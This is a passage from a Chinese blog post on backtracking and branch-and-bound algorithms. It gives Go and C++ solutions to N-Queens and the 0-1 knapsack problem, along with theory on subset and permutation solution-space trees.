<code>'Q'</code> 和 <code>'.'</code> 分别代表了皇后和空位。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 4</span><br><span class="line">输出：[[&quot;.Q..&quot;,&quot;...Q&quot;,&quot;Q...&quot;,&quot;..Q.&quot;],[&quot;..Q.&quot;,&quot;Q...&quot;,&quot;...Q&quot;,&quot;.Q..&quot;]]</span><br></pre></td></tr></table></figure></blockquote><p>这个问题本质上跟全排列问题差不多，决策树的每一层表示棋盘上的每一行；每个节点可以做出的选择是，在该行的任意一列放置一个皇后。</p><p>套用框架可得代码如下：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">solveNQueens</span><span class="params">(n <span class="type">int</span>)</span></span> [][]<span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">var</span> res [][]<span class="type">string</span></span><br><span class="line"><span class="keyword">var</span> board [][]<span class="type">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">board = <span class="built_in">append</span>(board, <span class="built_in">make</span>([]<span class="type">byte</span>, n))</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; n; j++ &#123;</span><br><span class="line">board[i][j] = <span class="string">&#x27;.&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="comment">//初始化棋盘为全&#x27;.&#x27;，即空</span></span><br><span class="line"><span class="keyword">var</span> backtrack <span class="function"><span class="keyword">func</span><span class="params">(row <span class="type">int</span>)</span></span> </span><br><span class="line">backtrack = <span class="function"><span class="keyword">func</span><span class="params">(row <span class="type">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> row == n &#123;<span class="comment">//结束条件</span></span><br><span class="line"><span class="keyword">var</span> tmp []<span class="type">string</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">tmp = <span class="built_in">append</span>(tmp, <span class="type">string</span>(board[i]))</span><br><span class="line">&#125;</span><br><span class="line">res = <span class="built_in">append</span>(res, tmp)<span class="comment">//找到一个解，将解加入结果集</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> col := <span class="number">0</span>; col &lt; n; col++ &#123;</span><br><span class="line"><span class="keyword">if</span> !isValid(board, row, col) &#123;<span class="comment">//剪枝</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">board[row][col] = <span class="string">&#x27;Q&#x27;</span><span class="comment">//进行选择</span></span><br><span class="line">backtrack(row + <span class="number">1</span>)<span class="comment">//递归</span></span><br><span class="line">board[row][col] = <span class="string">&#x27;.&#x27;</span><span class="comment">//撤销选择</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">backtrack(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isValid</span><span class="params">(board [][]<span class="type">byte</span>, row, col <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">n := <span class="built_in">len</span>(board)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> board[i][col] == <span class="string">&#x27;Q&#x27;</span> &#123;<span class="comment">//如果同一列有皇后</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, j := row<span class="number">-1</span>, col<span class="number">-1</span>; i &gt;= <span class="number">0</span> &amp;&amp; j &gt;= <span class="number">0</span>; i, j = i<span class="number">-1</span>, j<span class="number">-1</span> &#123;</span><br><span class="line"><span class="keyword">if</span> board[i][j] == <span class="string">&#x27;Q&#x27;</span> &#123;<span class="comment">//如果左上角有皇后</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, j := row<span class="number">-1</span>, col+<span class="number">1</span>; i &gt;= <span class="number">0</span> &amp;&amp; j &lt; n; i, j = i<span class="number">-1</span>, j+<span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">if</span> board[i][j] == <span class="string">&#x27;Q&#x27;</span> &#123;<span class="comment">//如果右上角有皇后</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>函数 <code>backtrack</code> 依然像个在决策树上游走的指针，通过 <code>row</code> 和 <code>col</code> 就可以表示函数遍历到的位置，通过 <code>isValid</code> 函数可以将不符合条件的情况剪枝。</p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>回溯算法就是个多叉树的遍历问题，关键就是在前序遍历和后序遍历的位置做一些操作。<strong>写 <code>backtrack</code> 函数时，需要维护走过的「路径」和当前可以做的「选择列表」，当触发「结束条件」时，将「路径」记入结果集</strong>。</p><blockquote><p>其实想想看，回溯算法和动态规划是不是有点像呢？我们在<a href="https://www.zhihu.com/search?q=%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%2293530380%22%7D">动态规划</a>系列文章中多次强调，动态规划的三个需要明确的点就是「状态」「选择」和「base case」，是不是就对应着走过的「路径」，当前的「选择列表」和「结束条件」？</p><p>某种程度上说，动态规划的暴力求解阶段就是回溯算法。只是有的问题具有重叠子问题性质，可以用 dp table 或者备忘录优化，将<a href="https://www.zhihu.com/search?q=%E9%80%92%E5%BD%92%E6%A0%91&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%2293530380%22%7D">递归树</a>大幅剪枝，这就变成了动态规划。而今天的两个问题，都没有重叠子问题，也就是<a href="https://www.zhihu.com/search?q=%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%2293530380%22%7D">回溯算法</a>问题了，复杂度非常高是不可避免的。</p></blockquote><h2 id="拓展部分"><a class="markdownIt-Anchor" href="#拓展部分"></a> 拓展部分</h2><p>以下内容来源于课件，偏理论，猜测整理自《算法导论》。</p><p>主要介绍解空间树的子集树和排列树的概念。</p><blockquote><p><strong>回溯法是一个既带有系统性又带有跳跃性的搜索算法；</strong></p><p>它在<strong>包含问题的所有解的解空间树</strong>中，按照深度优先的策略，从根结点出发搜索解空间树。—— 系统性</p><p>算法搜索至解空间树的任一结点时，判断该结点为根的子树是否包含问题的解，如果肯定不包含，则跳过以该结点为根的子树的搜索，逐层向其祖先结点回溯。否则，进入该子树，继续深度优先的策略进行搜索。——跳跃性</p><p>这种以深度优先的方式系统地搜索问题的解的算法称为回溯法，<br />它适用于解一些组合数较大的问题。许多复杂的、规模较大的问题都可以使用回溯法，有“通用解题方法”的美称。</p></blockquote><p>其实我觉得就是一种更加科学、附带剪枝的暴力搜索法。</p><p>要了解子集树和排列树，我们先对问题的解空间做一个定义。</p><blockquote><p>问题的解向量：回溯法希望一个问题的解能够表示成一个n元式</p><p>(x1, x2, …, xn) 的形式。</p><p>显约束：对分量xi的取值限定。</p><p>隐约束：为满足问题的解而对不同分量之间施加的约束。</p><p>解空间：对于问题的一个实例，解向量满足显式约束条件的所有多元组， 构成了该实例的一个解空间。</p></blockquote><p>注意：同一个问题可以有多种表示，有些表示方法更简单，所需表示的状态空间更小（存储量少，搜索方法简单）。</p><p>关于搜索空间主要有三种表示方法：</p><ul><li>表序表示：搜索对象通过线性表数据结构来表示</li><li>显示图表示：搜索对象在搜索开始前就通过图（树）的数据结构来表示</li><li>隐式图表示：除了初始节点，其他的节点在搜索过程中全部动态生成。因为搜索空间可能很大，难以全部储存。</li></ul><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240606162410585.png" alt="image-20240606162410585" /></p><p>对解空间的遍历方法可以参照二叉树的遍历方法，即前中后序遍历。一般我们使用中序遍历，因为这样就可以很方便的在搜索完左子树后撤销选择再进入右子树。</p><p>有了以上概念，我们就可以根据解空间树对回溯法的操作进行更加详细的定义：</p><ol><li>首先针对问题定义问题的解空间</li><li>接着确定易于搜索的解空间结构（子集树还是排列树）</li><li>以深度优先搜索的方式遍历解空间树，并在搜索过程中用剪枝函数避免无效搜索。<ul><li>常常用剪枝函数在扩展节点减去不满足约束的子树</li><li>减去得不到最优解的子树</li></ul></li></ol><p>两类常见的解空间树定义如下：</p><blockquote><p>子集树:当所给的问题是从几个元素的集合S中找出满足某种性质的子集时，相应的解空间树称为子集树。子集树通常有2<sup>n</sup>个叶子结点，其总结点个数为2<sup>n+1</sup>-1，遍历子集树时间为Ω(2<sup>n</sup>)。如0-1背包问题</p><p>排列树：当所给问题是确定n个元素满足某种性质的排列时，相应的解空间树称为排列树。排列树通常有n!个叶子结点，因此，遍历排列树需要Ω(n!)的计算时间。如TSP问题 (Traveling Salesman Problem，推销员问题) ，叶结点数为n!，遍历时间为Ω(n!)。</p></blockquote><h3 id="子集树"><a class="markdownIt-Anchor" href="#子集树"></a> 子集树</h3><p>假设现在有一列数a[0],a[1], …a[n-1]，如果一个问题的解的长度不是固定的，并且解和元素顺序无关，即可以从中选择0个或多个，那么解空间的个数将是指数级别的，为2^n,可以用下面的子集树来表示所有的解(假设这里n=4)</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240606213615107.png" alt="image-20240606213615107" /></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void backtrack(int t)&#123; // 表示访问到第t层，t从0开始</span><br><span class="line">if (t == n) // 如上图（PIC、子集树）n=4时就可以输出结果</span><br><span class="line">output(x);</span><br><span class="line">else</span><br><span class="line">for (int i = 0; i&lt;=l; i++)&#123; </span><br><span class="line">//表示选或者不选a[t]，l代表选项的范围，可能是0到某个上限</span><br><span class="line">x[t] = i;</span><br><span class="line">if (constraint(t) &amp;&amp; bound(t))</span><br><span class="line">backtrack(t + 1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="排列树"><a class="markdownIt-Anchor" href="#排列树"></a> 排列树</h3><p>如果解空间是由n个元素的排列形成，即n个元素的每一个排列都是解空间中的一个元素，那么，最后解空间的组织形式是排列树。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240606213643074.png" alt="image-20240606213643074" /></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void backtrack(int t)&#123; //t代表当前层数，从0开始，n代表总层数</span><br><span class="line">if (t == n)  // t==n时表示已经生成了一组全排列，输出结果</span><br><span class="line">output(x); // x是储存当前排列结果的数组</span><br><span class="line">else</span><br><span class="line">for (int i = t; i&lt;=n; i++)&#123; </span><br><span class="line">swap(x[t],x[i]);</span><br><span class="line">if (constraint(t) &amp;&amp; bound(t))</span><br><span class="line">&#123;</span><br><span class="line">backtrack(t + 1);</span><br><span class="line">swap(x[t],x[i]); // 每次递归后恢复原状</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//这里的n表示层数！</span><br></pre></td></tr></table></figure><h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3><p>下面给出用回溯法求解01背包问题的代码，出自我的课程实验报告：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//回溯法解决01背包问题</span></span><br><span class="line"><span class="comment">//结束条件：背包装满或者所有物品都放入背包</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Item</span>&#123;</span><br><span class="line">    <span class="type">int</span> weight;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backtrack</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> weight,<span class="type">int</span> value,<span class="type">const</span> vector&lt;Item&gt;&amp; items,<span class="type">int</span> capacity,<span class="type">int</span>&amp; maxValue)</span></span>&#123;</span><br><span class="line">    <span class="comment">//结束条件</span></span><br><span class="line">    <span class="keyword">if</span>(weight==capacity||i==items.<span class="built_in">size</span>())&#123;</span><br><span class="line">        maxValue=<span class="built_in">max</span>(value,maxValue);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//不选择物品</span></span><br><span class="line">    <span class="built_in">backtrack</span>(i+<span class="number">1</span>,weight,value,items,capacity,maxValue);</span><br><span class="line">    <span class="comment">//选择物品</span></span><br><span class="line">    <span class="keyword">if</span>(weight+items[i].weight&lt;=capacity)&#123;</span><br><span class="line">        <span class="built_in">backtrack</span>(i+<span class="number">1</span>,weight+items[i].weight,value+items[i].value,items,capacity,maxValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> capacity,count,maxValue;</span><br><span class="line">    vector&lt;Item&gt;Items;</span><br><span class="line">    maxValue=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//第一行输入背包总容量和物品数量</span></span><br><span class="line">    cin&gt;&gt;capacity&gt;&gt;count;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; ++i) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">Item</span> Item;</span><br><span class="line">        cin&gt;&gt;Item.weight&gt;&gt;Item.value;</span><br><span class="line">        Items.<span class="built_in">emplace_back</span>(Item);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">backtrack</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,Items,capacity,maxValue);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;The max value is &quot;</span>&lt;&lt;maxValue&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出设计理念参照的是解空间树的子集树，因为01背包问题是一个组合问题，与顺序无关，所以不需要撤销选择而直接遍历所有的解就行了。</p><h1 id="分支限界法"><a class="markdownIt-Anchor" href="#分支限界法"></a> 分支限界法</h1><p>回溯算法的思想其实和深度优先搜索也就是<code>DFS</code>有共通之处，一个要走到决策树底层才退出，一个是根据深度遍历，都是“打破南墙才回头”。这无疑是一种经典的暴力搜索的方式，但是这种方式具有盲目性，接下来我们来介绍基于<code>BFS</code>宽度优先搜索的分支限界法。</p><blockquote><p>分支限界法常以广度优先或以最小耗费(最大效益)优先的方式搜索问题的解空间树。</p><p>i) 对已处理的各结点根据<strong>限界函数</strong>估算目标函数的可能取值，</p><p>ii) 从中选出目标函数取得极大(极小) 值的结点优先进行广度优先搜索,</p><p>iii) 不断地调整搜索方向，尽快找到解，裁剪那些不能得到最优解的子树以提高搜索效率。</p></blockquote><p>其中的限界函数是针对具体问题的目标函数，比如对于01背包问题，可以预设限界函数为背包剩余空间的平均价值。</p><h2 id="求解步骤"><a class="markdownIt-Anchor" href="#求解步骤"></a> 求解步骤</h2><ol><li>定义解空间/对解编码</li><li>确定解空间的树结构</li><li>按照BFS的方式对解空间树进行遍历：<ol><li>每个活节点只有一次方式变为扩展节点</li><li>由扩展节点生成<strong>一步可达</strong>的新节点，即宽度搜索</li><li>在新节点中，删除不可能导出最优解的节点，这点可以利用限界函数辅助判断</li><li>将剩余的节点加入活动表（队列）中</li><li>从活动表中选择节点再进行扩展（分支）</li><li>直到活动表（队列）为空</li></ol></li></ol><p>在选择队列时有两种选择，对应两种分支限界法：</p><ol><li>队列式FIFO分支限界法：节点进入与取出顺序与普通队列相同</li><li>优先队列（代价最小或者效益最大）分支限界法：每个节点都可以借助限界函数来预估一个价值，以此决定节点处理的优先级，一般要用到堆来实现优先队列。</li></ol><h2 id="例题-2"><a class="markdownIt-Anchor" href="#例题-2"></a> 例题</h2><p>这里给出对01背包应用分支限界法的解法，包括FIFO式和优先队列式。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分支限界法 FIFO普通队列管理 解决01背包问题</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Node <span class="keyword">struct</span> &#123;</span><br><span class="line">level    <span class="type">int</span>     <span class="comment">// 表示当前决策层的层数</span></span><br><span class="line">weight   <span class="type">float64</span> <span class="comment">// 表示目前为止所选择物品的重量总和</span></span><br><span class="line">value    <span class="type">float64</span> <span class="comment">// 表示目前为止所选择物品的价值总和</span></span><br><span class="line">bound    <span class="type">float64</span> <span class="comment">// 表示此节点的价值上界</span></span><br><span class="line">included <span class="type">bool</span>    <span class="comment">// 表示该节点所对应的对象是否被放到背包中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bound</span><span class="params">(node Node, n <span class="type">int</span>, W <span class="type">float64</span>, weights []<span class="type">float64</span>, values []<span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123; <span class="comment">// 计算节点的价值上界</span></span><br><span class="line"><span class="keyword">if</span> node.weight &gt;= W &#123; <span class="comment">// 如果当前节点的重量已经超过了背包的容量，则无需继续探索，直接剪枝</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">bound := node.value      <span class="comment">// 计算当前节点的价值上界</span></span><br><span class="line">j := node.level + <span class="number">1</span>      <span class="comment">// 初始化下一个物品的索引</span></span><br><span class="line">totWeight := node.weight <span class="comment">// 计算当前节点的重量总和</span></span><br><span class="line"><span class="keyword">for</span> ; j &lt; n; j++ &#123;       <span class="comment">// 遍历剩余物品</span></span><br><span class="line"><span class="keyword">if</span> totWeight+weights[j] &lt;= W &#123; <span class="comment">// 如果当前节点的重量加上下一个物品的重量小于等于背包的容量</span></span><br><span class="line">bound += values[j]      <span class="comment">// 则加上下一个物品的价值</span></span><br><span class="line">totWeight += weights[j] <span class="comment">// 并更新当前节点的重量总和</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果当前节点的重量加上下一个物品的重量大于背包的容量</span></span><br><span class="line"><span class="keyword">break</span> <span class="comment">// 则停止遍历</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> j &lt; n &#123;</span><br><span class="line">bound += (W - totWeight) * (values[j] / weights[j]) <span class="comment">// 计算剩余物品的价值上界</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bound</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">knapsack01</span><span class="params">(n <span class="type">int</span>, W <span class="type">float64</span>, weights []<span class="type">float64</span>, values []<span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">var</span> maxValue <span class="type">float64</span></span><br><span class="line"><span class="keyword">var</span> queue []Node</span><br><span class="line"><span class="keyword">var</span> initNode Node</span><br><span class="line">initNode.level = <span class="number">-1</span></span><br><span class="line">initNode.weight = <span class="number">0</span></span><br><span class="line">initNode.value = <span class="number">0</span></span><br><span class="line">queue = <span class="built_in">append</span>(queue, initNode) <span class="comment">// 加入初始节点到队列中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span>(queue) &gt; <span class="number">0</span> &#123;</span><br><span class="line">node := queue[<span class="number">0</span>]</span><br><span class="line">queue = queue[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> node.level == <span class="number">-1</span> &#123;</span><br><span class="line">node.bound = bound(node, n, W, weights, values) <span class="comment">// 计算初始节点的价值上界</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> node.bound &gt; maxValue &#123; <span class="comment">// 如果当前节点的价值上界大于最大值</span></span><br><span class="line">leftNode := Node&#123; <span class="comment">// 左节点代表选择当前物品</span></span><br><span class="line">level:  node.level + <span class="number">1</span>,</span><br><span class="line">weight: node.weight + weights[node.level+<span class="number">1</span>], <span class="comment">// 加上当前物品的重量</span></span><br><span class="line">value:  node.value + values[node.level+<span class="number">1</span>]&#125;</span><br><span class="line">leftNode.bound = bound(leftNode, n, W, weights, values)</span><br><span class="line"><span class="keyword">if</span> leftNode.weight &lt;= W &amp;&amp; leftNode.value &gt; maxValue &#123;</span><br><span class="line">maxValue = leftNode.value</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> leftNode.bound &gt; maxValue &#123; <span class="comment">// 如果左节点的价值上界大于最大值</span></span><br><span class="line">queue = <span class="built_in">append</span>(queue, leftNode) <span class="comment">// 加入左节点到队列中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rightNode := Node&#123; <span class="comment">// 右节点代表不选择当前物品</span></span><br><span class="line">level:  node.level + <span class="number">1</span>,</span><br><span class="line">weight: node.weight,</span><br><span class="line">value:  node.value&#125;</span><br><span class="line">rightNode.bound = bound(rightNode, n, W, weights, values) <span class="comment">// 计算右节点的价值上界</span></span><br><span class="line"><span class="keyword">if</span> rightNode.bound &gt; maxValue &#123;                           <span class="comment">// 如果右节点的价值上界大于最大值，事实上永远都可以进入右节点</span></span><br><span class="line">queue = <span class="built_in">append</span>(queue, rightNode) <span class="comment">// 加入右节点到队列中</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> maxValue</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//输入物品数量</span></span><br><span class="line"><span class="keyword">var</span> n <span class="type">int</span></span><br><span class="line">fmt.Scan(&amp;n)</span><br><span class="line"><span class="comment">//输入背包容量</span></span><br><span class="line"><span class="keyword">var</span> W <span class="type">int</span></span><br><span class="line">fmt.Scan(&amp;W)</span><br><span class="line"><span class="comment">//输入物品重量</span></span><br><span class="line"><span class="keyword">var</span> weights = <span class="built_in">make</span>([]<span class="type">float64</span>, n)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">fmt.Scan(&amp;weights[i])</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输入物品价值</span></span><br><span class="line"><span class="keyword">var</span> values = <span class="built_in">make</span>([]<span class="type">float64</span>, n)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">fmt.Scan(&amp;values[i])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result := knapsack01(n, <span class="type">float64</span>(W), weights, values)</span><br><span class="line">fmt.Println(<span class="string">&quot;Maximum value that can be obtained is:&quot;</span>, result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//分支限界法 优先队列管理 解决01背包问题</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;container/heap&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Node <span class="keyword">struct</span> &#123;</span><br><span class="line">level    <span class="type">int</span>     <span class="comment">// 表示当前决策层的层数</span></span><br><span class="line">weight   <span class="type">float64</span> <span class="comment">// 表示目前为止所选择物品的重量总和</span></span><br><span class="line">value    <span class="type">float64</span> <span class="comment">// 表示目前为止所选择物品的价值总和</span></span><br><span class="line">bound    <span class="type">float64</span> <span class="comment">// 表示此节点的价值上界</span></span><br><span class="line">included <span class="type">bool</span>    <span class="comment">// 表示该节点所对应的对象是否被放到背包中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PriorityQueue 优先队列实现最大堆功能</span></span><br><span class="line"><span class="keyword">type</span> PriorityQueue []Node</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pq PriorityQueue)</span></span> Len() <span class="type">int</span> &#123; <span class="keyword">return</span> <span class="built_in">len</span>(pq) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pq PriorityQueue)</span></span> Less(i, j <span class="type">int</span>) <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">return</span> pq[i].bound &gt; pq[j].bound</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pq PriorityQueue)</span></span> Swap(i, j <span class="type">int</span>) &#123;</span><br><span class="line">pq[i], pq[j] = pq[j], pq[i]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pq *PriorityQueue)</span></span> Push(x <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">item := x.(Node)</span><br><span class="line">*pq = <span class="built_in">append</span>(*pq, item)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pq *PriorityQueue)</span></span> Pop() <span class="keyword">interface</span>&#123;&#125; &#123;</span><br><span class="line">old := *pq</span><br><span class="line">n := <span class="built_in">len</span>(old)</span><br><span class="line">item := old[n<span class="number">-1</span>]</span><br><span class="line">*pq = old[<span class="number">0</span> : n<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> item</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bound</span><span class="params">(node Node, n <span class="type">int</span>, W <span class="type">float64</span>, weights []<span class="type">float64</span>, values []<span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123; <span class="comment">// 计算节点的价值上界</span></span><br><span class="line"><span class="keyword">if</span> node.weight &gt;= W &#123; <span class="comment">// 如果当前节点的重量已经超过了背包的容量，则无需继续探索，直接剪枝</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">bound := node.value      <span class="comment">// 计算当前节点的价值上界</span></span><br><span class="line">j := node.level + <span class="number">1</span>      <span class="comment">// 初始化下一个物品的索引</span></span><br><span class="line">totWeight := node.weight <span class="comment">// 计算当前节点的重量总和</span></span><br><span class="line"><span class="keyword">for</span> ; j &lt; n; j++ &#123;       <span class="comment">// 遍历剩余物品</span></span><br><span class="line"><span class="keyword">if</span> totWeight+weights[j] &lt;= W &#123; <span class="comment">// 如果当前节点的重量加上下一个物品的重量小于等于背包的容量</span></span><br><span class="line">bound += values[j]      <span class="comment">// 则加上下一个物品的价值</span></span><br><span class="line">totWeight += weights[j] <span class="comment">// 并更新当前节点的重量总和</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果当前节点的重量加上下一个物品的重量大于背包的容量</span></span><br><span class="line"><span class="keyword">break</span> <span class="comment">// 则停止遍历</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> j &lt; n &#123;</span><br><span class="line">bound += (W - totWeight) * (values[j] / weights[j]) <span class="comment">// 计算剩余物品的价值上界</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bound</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">knapsack01</span><span class="params">(n <span class="type">int</span>, W <span class="type">float64</span>, weights []<span class="type">float64</span>, values []<span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">var</span> maxValue <span class="type">float64</span></span><br><span class="line"><span class="keyword">var</span> queue = <span class="built_in">make</span>(PriorityQueue, <span class="number">0</span>)</span><br><span class="line">heap.Init(&amp;queue)</span><br><span class="line"><span class="keyword">var</span> initNode Node</span><br><span class="line">initNode.level = <span class="number">-1</span></span><br><span class="line">initNode.weight = <span class="number">0</span></span><br><span class="line">initNode.value = <span class="number">0</span></span><br><span class="line">queue.Push(initNode)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> queue.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">node := heap.Pop(&amp;queue).(Node)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> node.level == <span class="number">-1</span> &#123;</span><br><span class="line">node.bound = bound(node, n, W, weights, values) <span class="comment">// 计算初始节点的价值上界</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> node.bound &gt; maxValue &#123; <span class="comment">// 如果当前节点的价值上界大于最大值</span></span><br><span class="line">leftNode := Node&#123; <span class="comment">// 左节点代表选择当前物品</span></span><br><span class="line">level:  node.level + 